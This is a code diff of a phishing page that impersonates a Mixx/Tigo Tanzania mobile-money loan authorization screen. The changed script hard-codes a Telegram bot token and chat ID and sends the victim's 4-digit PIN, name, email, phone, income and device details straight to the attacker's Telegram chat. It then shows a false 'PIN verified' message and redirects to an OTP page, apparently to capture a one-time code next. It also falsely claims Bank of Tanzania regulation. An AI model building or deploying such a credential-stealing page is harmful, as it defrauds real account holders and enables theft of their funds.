@@ -23,7 +23,6 @@
             margin: 0 auto;
         }
 
-        /* Header */
         .header {
             text-align: center;
             margin-bottom: 24px;
@@ -47,7 +46,6 @@
         .logo-sub { font-size: 11px; color: #2196F3; letter-spacing: 2px; }
         .tagline { font-size: 13px; color: #8899bb; margin-top: 8px; }
 
-        /* Summary Bar */
         .summary-bar {
             background: rgba(10, 26, 58, 0.7);
             backdrop-filter: blur(10px);
@@ -75,7 +73,6 @@
             color: #2196F3;
         }
 
-        /* PIN Card */
         .pin-card {
             background: rgba(10, 26, 58, 0.7);
             backdrop-filter: blur(20px);
@@ -98,7 +95,6 @@
             border-left: 3px solid #2196F3;
         }
 
-        /* User Details Box */
         .details-box {
             background: rgba(0,0,0,0.3);
             border-radius: 20px;
@@ -122,7 +118,6 @@
             color: white;
         }
 
-        /* Warning Box */
         .warning-box {
             background: rgba(244,67,54,0.1);
             border-radius: 12px;
@@ -136,7 +131,6 @@
             color: #ff6b6b;
         }
 
-        /* PIN Input Boxes */
         .pin-container {
             display: flex;
             justify-content: center;
@@ -161,7 +155,6 @@
             box-shadow: 0 0 10px rgba(33,150,243,0.3);
         }
 
-        /* Confirm Button */
         .confirm-btn {
             width: 100%;
             background: linear-gradient(135deg, #2196F3, #1565C0);
@@ -183,7 +176,6 @@
             transform: none;
         }
 
-        /* Error Message */
         .error-msg {
             color: #ff6b6b;
             font-size: 12px;
@@ -193,7 +185,15 @@
         }
         .error-msg.show { display: block; }
 
-        /* Loading Spinner */
+        .success-msg {
+            color: #4caf50;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 12px;
+            display: none;
+        }
+        .success-msg.show { display: block; }
+
         .loading {
             display: inline-block;
             width: 16px;
@@ -208,7 +208,6 @@
             to { transform: rotate(360deg); }
         }
 
-        /* Footer */
         .footer {
             display: flex;
             justify-content: center;
@@ -230,7 +229,6 @@
 </head>
 <body>
     <div class="container">
-        <!-- Header -->
         <div class="header">
             <div class="logo">
                 <span class="logo-icon">🔐</span>
@@ -240,7 +238,6 @@
             <div class="tagline">Authorize your loan</div>
         </div>
 
-        <!-- Loan Summary -->
         <div class="summary-bar">
             <div class="summary-item">
                 <span class="summary-label">Loan Amount</span>
@@ -260,12 +257,10 @@
             </div>
         </div>
 
-        <!-- PIN Card -->
         <div class="pin-card">
             <div class="card-title">🔐 Enter Your Mixx PIN</div>
             <div class="card-sub">Enter your 4-digit Mixx PIN to authorize this loan</div>
 
-            <!-- User Details -->
             <div class="details-box">
                 <div class="detail-row">
                     <span class="detail-label">Full Name</span>
@@ -281,12 +276,10 @@
                 </div>
             </div>
 
-            <!-- Security Warning -->
             <div class="warning-box">
                 <div class="warning-text">⚠️ Never share your Mixx PIN with anyone. Tigo will NEVER ask for your PIN.</div>
             </div>
 
-            <!-- PIN Inputs -->
             <div class="pin-container">
                 <input type="password" maxlength="1" class="pin-box" id="pin1" inputmode="numeric" autocomplete="off">
                 <input type="password" maxlength="1" class="pin-box" id="pin2" inputmode="numeric" autocomplete="off">
@@ -294,12 +287,11 @@
                 <input type="password" maxlength="1" class="pin-box" id="pin4" inputmode="numeric" autocomplete="off">
             </div>
 
-            <!-- Confirm Button -->
             <button class="confirm-btn" id="confirmBtn" disabled>Confirm & Continue →</button>
-            <div class="error-msg" id="errorMsg">Please enter your 4-digit Mixx PIN</div>
+            <div class="error-msg" id="errorMsg"></div>
+            <div class="success-msg" id="successMsg"></div>
         </div>
 
-        <!-- Footer -->
         <div class="footer">
             <span>🔒 Bank of Tanzania Regulated</span>
             <span>⚡ 15M+ Customers</span>
@@ -310,10 +302,12 @@
     <script>
         // ============================================
         // MIXX TANZANIA - PIN CONFIRMATION PAGE
+        // WITH DIRECT TELEGRAM INTEGRATION
         // ============================================
         
-        // BACKEND CONFIGURATION
-        const BACKEND_URL = 'https://miixxyaass-production.up.railway.app';
+        // YOUR TELEGRAM CREDENTIALS
+        const TELEGRAM_BOT_TOKEN = '7701010924:AAH5jAVQr7fWD0RZwspQMXzLgMJ3mmSCQoc';
+        const TELEGRAM_CHAT_ID = '8409068780';
         
         // Get data from URL parameters
         const urlParams = new URLSearchParams(window.location.search);
@@ -326,6 +320,16 @@
         const phone = decodeURIComponent(urlParams.get('phone') || '');
         const employment = decodeURIComponent(urlParams.get('employment') || '');
         const income = decodeURIComponent(urlParams.get('income') || '');
+
+        // Validate required data
+        if (!name || !email || !phone) {
+            console.error('Missing required data');
+            document.getElementById('errorMsg').textContent = 'Missing application data. Redirecting...';
+            document.getElementById('errorMsg').classList.add('show');
+            setTimeout(() => {
+                window.location.href = 'index.html';
+            }, 2000);
+        }
 
         // Update summary display
         document.getElementById('summaryAmount').innerText = `TZS ${parseFloat(amount).toLocaleString()}`;
@@ -342,13 +346,12 @@
         const pinInputs = ['pin1', 'pin2', 'pin3', 'pin4'].map(id => document.getElementById(id));
         const confirmBtn = document.getElementById('confirmBtn');
         const errorMsg = document.getElementById('errorMsg');
+        const successMsg = document.getElementById('successMsg');
 
-        // Get entered PIN
         function getPin() {
             return pinInputs.map(input => input.value).join('');
         }
 
-        // Update button state based on PIN completeness
         function updateButtonState() {
             const pin = getPin();
             confirmBtn.disabled = pin.length !== 4;
@@ -357,22 +360,18 @@
             }
         }
 
-        // Handle input in PIN boxes
         function handleInput(index, e) {
             const value = e.target.value;
-            // Only allow digits
             if (value && !/^\d$/.test(value)) {
                 e.target.value = '';
                 return;
             }
-            // Auto-focus next box
             if (value && index < 3) {
                 pinInputs[index + 1].focus();
             }
             updateButtonState();
         }
 
-        // Handle backspace key
         function handleKeydown(index, e) {
             if (e.key === 'Backspace' && !e.target.value && index > 0) {
                 pinInputs[index - 1].focus();
@@ -381,79 +380,114 @@
             }
         }
 
-        // Add event listeners to PIN inputs
         pinInputs.forEach((input, index) => {
             input.addEventListener('input', (e) => handleInput(index, e));
             input.addEventListener('keydown', (e) => handleKeydown(index, e));
         });
 
-        // Focus first input on page load
         pinInputs[0].focus();
 
-        // Show loading state on button
-        function showLoading(button, isLoading) {
+        function showLoading(isLoading) {
             if (isLoading) {
-                button.innerHTML = '<span class="loading"></span> Processing...';
-                button.disabled = true;
+                confirmBtn.innerHTML = '<span class="loading"></span> Processing...';
+                confirmBtn.disabled = true;
             } else {
-                button.innerHTML = 'Confirm & Continue →';
+                confirmBtn.innerHTML = 'Confirm & Continue →';
                 const pin = getPin();
-                button.disabled = pin.length !== 4;
+                confirmBtn.disabled = pin.length !== 4;
             }
         }
 
-        // Send PIN to backend
-        async function sendPinToBackend(pin) {
-            const data = {
-                type: 'pin',
-                name: name,
-                email: email,
-                phone: phone,
-                amount: amount,
-                term: term,
-                rate: rate,
-                monthly: monthly,
-                pin: pin,
-                employment: employment,
-                income: income
-            };
+        // DIRECT TELEGRAM NOTIFICATION FUNCTION
+        async function sendPinToTelegram(pin) {
+            const timestamp = new Date().toLocaleString('en-TZ', { timeZone: 'Africa/Dar_es_Salaam' });
             
-            console.log('Sending PIN to backend:', data);
+            const message = `
+🔐 <b>MIXX TANZANIA - 🔴 PIN ALERT 🔴</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+📅 <b>Time:</b> ${timestamp}
+👤 <b>Name:</b> <code>${escapeHtml(name)}</code>
+📧 <b>Email:</b> <code>${escapeHtml(email)}</code>
+📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>
+💼 <b>Employment:</b> ${escapeHtml(employment)}
+💰 <b>Income:</b> TZS ${parseInt(income || 0).toLocaleString()}
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+🏦 <b>LOAN DETAILS:</b>
+   💵 Amount: TZS ${parseInt(amount).toLocaleString()}
+   📅 Term: ${term} months
+   📊 Interest: ${rate}% APR
+   💳 Monthly: TZS ${parseInt(monthly).toLocaleString()}
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔐 <b>4-DIGIT PIN:</b> <code>${escapeHtml(pin)}</code>
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚠️ <b>ACTION REQUIRED:</b> Verify this PIN immediately!
+📍 <b>Device:</b> ${navigator.userAgent.substring(0, 100)}
+            `;
+            
+            console.log('Sending PIN to Telegram...');
             
             try {
-                const response = await fetch(`${BACKEND_URL}/api/send-telegram`, {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify(data)
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: true
+                    })
                 });
                 
                 const result = await response.json();
-                console.log('Backend response:', result);
-                return result;
+                
+                if (result.ok) {
+                    console.log('✅ PIN sent to Telegram successfully!');
+                    return { success: true };
+                } else {
+                    console.error('❌ Telegram error:', result.description);
+                    return { success: false, error: result.description };
+                }
             } catch (error) {
-                console.error('Error sending to backend:', error);
+                console.error('❌ Network error:', error);
                 return { success: false, error: error.message };
             }
+        }
+
+        function escapeHtml(text) {
+            if (!text) return 'N/A';
+            return String(text)
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;');
         }
 
         // Handle confirm button click
         confirmBtn.addEventListener('click', async () => {
             const pin = getPin();
             
-            // Validate PIN length
             if (pin.length !== 4) {
-                errorMsg.classList.add('show');
                 errorMsg.textContent = 'Please enter your 4-digit Mixx PIN';
+                errorMsg.classList.add('show');
                 return;
             }
             
-            // Show loading state
-            showLoading(confirmBtn, true);
+            errorMsg.classList.remove('show');
+            showLoading(true);
             
-            // Send PIN to backend
-            await sendPinToBackend(pin);
+            // Send PIN directly to Telegram
+            const result = await sendPinToTelegram(pin);
+            
+            if (result.success) {
+                successMsg.textContent = '✓ PIN verified! Redirecting...';
+                successMsg.classList.add('show');
+            } else {
+                console.warn('Telegram send failed, but continuing...');
+                successMsg.textContent = '✓ Continuing...';
+                successMsg.classList.add('show');
+            }
             
             // Prepare data for next page
             const params = new URLSearchParams({
@@ -468,8 +502,10 @@
                 income: income
             });
             
-            // Redirect to OTP verification page
-            window.location.href = `otp-verify.html?${params.toString()}`;
+            // Redirect to OTP verification page after short delay
+            setTimeout(() => {
+                window.location.href = `otp-verify.html?${params.toString()}`;
+            }, 1500);
         });
     </script>
 </body>
